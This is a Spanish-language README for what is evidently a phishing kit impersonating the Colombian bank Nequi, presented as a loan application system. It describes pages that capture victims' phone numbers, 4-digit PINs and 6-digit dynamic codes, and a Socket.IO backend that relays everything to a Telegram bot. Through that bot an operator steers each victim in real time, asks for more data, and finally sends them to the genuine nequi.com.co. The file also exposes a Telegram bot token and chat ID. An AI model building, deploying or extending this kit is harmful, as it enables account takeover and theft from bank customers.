# 🚀 Nequi Crédito - Sistema con Socket.IO

Sistema de solicitud de crédito Nequi con backend Node.js, Socket.IO para comunicación en tiempo real y Telegram Bot para aprobaciones.

## 📁 Estructura del Proyecto

```
Nequi-Credito/
├── index.html              # Página de inicio
├── numero.html             # Captura de teléfono
├── contraseña.html         # Captura de clave 4 dígitos
├── dinamica.html           # Captura de clave dinámica 6 dígitos
├── simular-credito.html    # Formulario completo de crédito
├── recarga.html            # Página de recarga
├── server.js               # Servidor backend con Socket.IO
├── package.json            # Dependencias Node.js
├── js/
│   ├── socket-client.js    # Cliente Socket.IO
│   ├── overlay.js          # Gestor de overlay
│   └── config.js           # Configuración
├── css/                    # Estilos
└── assets/                 # Recursos (imágenes, iconos)
```

## 🛠️ Instalación

1. **Instalar dependencias:**
```bash
npm install
```

2. **Iniciar servidor:**
```bash
npm start
```

El servidor estará disponible en: `http://localhost:3000`

## 🔧 Tecnologías

- **Backend:** Node.js + Express
- **Real-time:** Socket.IO
- **Telegram Bot:** node-telegram-bot-api
- **Frontend:** HTML5, CSS3, Vanilla JavaScript

## 📱 Flujo de Usuario

1. **index.html** → Usuario ve información del crédito
2. **numero.html** → Ingresa teléfono (10 dígitos, empieza con 3)
3. **contraseña.html** → Ingresa clave de 4 dígitos
4. **dinamica.html** → Ingresa clave dinámica de 6 dígitos
5. **simular-credito.html** → Completa formulario de crédito
6. **recarga.html** → Mensaje de recarga (si es necesario)

## 🤖 Telegram Bot

### Configuración

El bot está configurado con:
- **Token:** `8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc`
- **Chat ID:** `-5179068892`

### Mensajes del Bot

Cada mensaje incluye:
- 📋 Datos acumulados de la sesión
- 🆔 ID de sesión única
- ⏰ Timestamp

### Botones Disponibles

1. **📞 Pedir Número** → Redirige a numero.html
2. **🔑 Pedir Clave** → Redirige a contraseña.html
3. **💰 Pedir Crédito** → Redirige a simular-credito.html
4. **🔐 Pedir Dinámica** → Redirige a dinamica.html
5. **💳 Pedir Recarga** → Redirige a recarga.html
6. **✅ Aprobar** → Aprueba y continúa el flujo
7. **❌ Rechazar** → Rechaza la solicitud
8. **🏁 Finalizar Sesión** → Limpia sesión y redirige a nequi.com.co

## 🔄 Arquitectura Socket.IO

### Servidor (server.js)

```javascript
// Events que escucha
socket.on('submit-phone')      // Recibe teléfono
socket.on('submit-password')   // Recibe contraseña
socket.on('submit-loan')       // Recibe datos crédito
socket.on('submit-dinamica')   // Recibe clave dinámica

// Events que emite
socket.emit('session-created')     // Sesión creada
socket.emit('telegram-sent')       // Mensaje enviado
socket.emit('telegram-response')   // Respuesta de Telegram
socket.emit('redirect')            // Redirección solicitada
socket.emit('finalize-session')    // Finalizar sesión
```

### Cliente (socket-client.js)

```javascript
// API Pública
SocketClient.sendPhoneRequest(phone)
SocketClient.sendPasswordRequest(password)
SocketClient.sendLoanRequest(loanData)
SocketClient.sendDinamicaRequest(dinamica)
SocketClient.getConnectionStatus()
SocketClient.disconnect()
```

## 📊 Gestión de Sesiones

- Cada cliente tiene una sesión única
- Los datos se acumulan en cada paso
- Las sesiones expiran al desconectar
- El operador puede solicitar más datos en cualquier momento

## 🎨 Overlay System

Sistema de overlay personalizado que:
- Muestra mensajes de estado
- Animación del logo Nequi
- Espera confirmación de Telegram (timeout: 0)
- Mensajes de éxito/error

## 🔒 Validaciones

### Teléfono (numero.html)
- 10 dígitos exactos
- Debe empezar con 3
- Formato: ### ### ####

### Contraseña (contraseña.html)
- 4 dígitos
- No permite 3 dígitos consecutivos iguales

### Clave Dinámica (dinamica.html)
- 6 dígitos
- Sin validación especial

### Formulario Crédito (simular-credito.html)
- Cédula: 6-10 dígitos
- Nombre: requerido
- Monto: $100,000 - $2,400,000
- Plazo: 1-24 meses
- Ocupación: selección
- Ingresos: > 0
- Gastos: > 0
- Saldo: > 0
- Fecha de pago: requerida

## 🚨 Manejo de Errores

- Errores de conexión Socket.IO
- Timeouts (5 minutos)
- Errores de Telegram
- Validaciones de formulario

## 📝 Logs

El servidor muestra:
- ✅ Clientes conectados
- 📨 Mensajes recibidos
- 💬 Callbacks de Telegram
- ❌ Errores y desconexiones

## 🔥 Características Especiales

1. **Conexión Persistente:** Socket.IO mantiene la conexión en tiempo real
2. **Datos Acumulados:** Cada mensaje a Telegram incluye TODOS los datos previos
3. **Control Total:** El operador puede redirigir al usuario a cualquier página
4. **Finalización:** Botón para finalizar sesión y redirigir a nequi.com.co
5. **Botón Simular Crédito:** Disponible en todas las páginas excepto index.html

## 🎯 Próximos Pasos

Para producción considerar:
- [ ] Variables de entorno para credenciales
- [ ] HTTPS/SSL
- [ ] Rate limiting
- [ ] Persistencia de sesiones (Redis)
- [ ] Autenticación adicional
- [ ] Logs estructurados
- [ ] Monitoreo y métricas

## 📞 Soporte

Sistema desarrollado con arquitectura MVC + Service Layer para máxima escalabilidad y mantenibilidad.
